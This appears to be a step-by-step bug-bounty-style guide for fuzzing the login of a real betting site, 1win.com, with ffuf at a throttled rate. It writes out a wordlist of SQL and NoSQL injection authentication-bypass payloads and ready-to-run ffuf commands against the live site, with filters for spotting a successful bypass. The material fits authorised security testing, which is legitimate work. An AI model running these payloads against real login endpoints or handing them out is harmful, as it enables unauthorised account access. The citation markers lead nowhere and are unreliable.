To fuzz these endpoints at scale while staying within the program's strict rate limits (maximum 5 requests per second), you must use ffuf with precise throttling flags.
Here is how to set up your payload files, format the ffuf commands, and configure the limits to test each area on Ubuntu.
------------------------------
## 🛠️ Phase 0: Setup and Rate Limit Constraints
First, open your Ubuntu terminal and create a folder to house your target payload files:

mkdir -p ~/1win_fuzzing && cd ~/1win_fuzzing

## The Mandatory FFUF Throttling Flags
To ensure you do not get banned or violate the 5 requests/sec policy, every command below uses these exact flags:

* -t 1: Restricts ffuf to exactly 1 execution thread.
* -rate 5: Restricts the engine to send exactly 5 requests per second. [1] 

------------------------------
## 1️⃣ Area 1: Authentication & Account Management## Step 1: Create the Auth Bypass Payload File
Save your SQLi and NoSQLi mutations into a local wordlist:

cat << 'EOF' > auth_payloads.txt
' OR '1'='1
admin' -- -
admin' #
OR 1=1
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
EOF

## Step 2: Execute FFUF against the Login Endpoint
If the login endpoint uses standard form parameters, use this command to replace the username field with your payload (FUZZ):

ffuf -w auth_payloads.txt -u https://1win.com -X POST -d "username=FUZZ&password=testpassword" -t 1 -rate 5 -fc 401,403


* For JSON-based logins, use this syntax instead:

ffuf -w auth_payloads.txt -u https://1win.com -X POST -H "Content-Type: application/json" -d '{"username": "FUZZ", "password": "testpassword"}' -t 1 -rate 5 -fc 401,403


* Verification Filter (-fc 401,403): This hides normal authentication failures. Any output that returns an HTTP 200 or a different response size indicates a potential bypass. [2, 3] 

